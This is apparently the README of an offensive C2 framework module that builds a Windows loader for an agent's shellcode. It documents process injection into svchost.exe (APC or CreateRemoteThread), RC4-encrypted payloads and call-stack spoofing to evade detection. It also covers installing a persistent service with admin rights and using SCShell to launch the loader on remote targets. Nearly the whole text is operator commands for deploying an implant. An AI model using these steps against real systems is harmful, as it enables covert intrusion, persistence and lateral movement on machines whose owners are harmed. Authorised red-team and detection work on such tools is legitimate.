# loader_windows

Builds a Windows loader for a Donut sRDI shellcode blob. The loader starts the
agent inside a sacrificial process and can be packaged as a Windows service
(default), a plain executable, or a DLL.

Run it from the operator console.

## Before you start

- Build a Windows agent with
  `generate --type windows_executable --arch amd64 --cc <host>` and use the
  matching `.bin` shellcode it produces.
- `--arch` must match the shellcode: `x64` for amd64, `x86` for 386.
- `nasm` is required on the C2 for the default `--smw on` on x64. Use
  `--smw off` to build without it.

## Usage

```bash
loader_windows --shellcode /path/to/agent.exe.bin [options]
```

Resident Windows service (default):

```bash
loader_windows --shellcode /path/to/agent.exe.bin
```

Plain executable:

```bash
loader_windows --shellcode /path/to/agent.exe.bin --format exe --output /tmp/loader.exe
```

DLL exporting `Run()`:

```bash
loader_windows --shellcode /path/to/agent.exe.bin --format dll
```

## Options

| Option | Default | Use |
| --- | --- | --- |
| `--shellcode` | required | Donut sRDI shellcode blob to embed |
| `--format` | `service` | `service`, `exe`, or `dll` |
| `--output` | next to the shellcode | Output file path |
| `--process` | `svchost.exe` | Sacrificial process: System32 name or full path |
| `--process-args` | empty | Optional arguments for the sacrificial process |
| `--arch` | `x64` | `x64` or `x86`; must match the shellcode |
| `--key` | random | RC4 key for the shellcode as hex |
| `--inject` | `apc` | `apc` early-bird injection, or `ct` for `CreateRemoteThread` |
| `--smw` | `on` | SilentMoonwalk call-stack spoofing on x64: `on` or `off` |
| `--verify-ms` | `5000` | Time to watch the child after injection; `0` skips the check |
| `--debug` | `false` | Keep diagnostics in the built binaries |

With `--inject ct`, choose a process that stays alive, for example
`--process notepad.exe`. The default `apc` injection parks the sacrificial
process, so `svchost.exe` and `dllhost.exe` stay alive.

The build prints the generated artifact path. Without `--output`, it is written
next to the shellcode with `_svc.exe`, `.exe`, or `.dll` appended.

## On the target

Service build:

```text
loader_svc.exe --install
sc start loader_svc
sc query loader_svc
sc stop loader_svc
sc delete loader_svc
```

The service needs administrator rights. It stays installed after it starts;
remove it with `sc delete` only if you no longer need it.

Executable build: run it once. DLL build: call its `Run()` export, for example
`rundll32 loader.dll,Run`.

To start the plain executable through an existing service, use SCShell:

```text
scshell <target> defragsvc C:\Windows\Temp\loader.exe
```
